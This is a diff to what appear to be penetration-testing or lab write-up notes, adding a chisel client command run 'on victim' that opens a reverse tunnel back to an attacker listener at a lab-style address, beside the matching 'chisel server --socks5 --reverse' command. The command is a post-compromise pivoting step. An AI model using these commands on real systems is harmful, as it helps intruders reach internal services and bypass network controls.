@@ -140,7 +140,9 @@ On local:
 `chisel server --socks5 --reverse`
 
 On victim:
-``
+`chisel.exe client --fingerprint iZ3iUKs5hO1F7FamcuKBpmgQ0iZZDOTBhfmH2jVkjJQ= 10.10.14.226:8080 R:8001:127.0.0.1:8000`
+
+
 
 
 
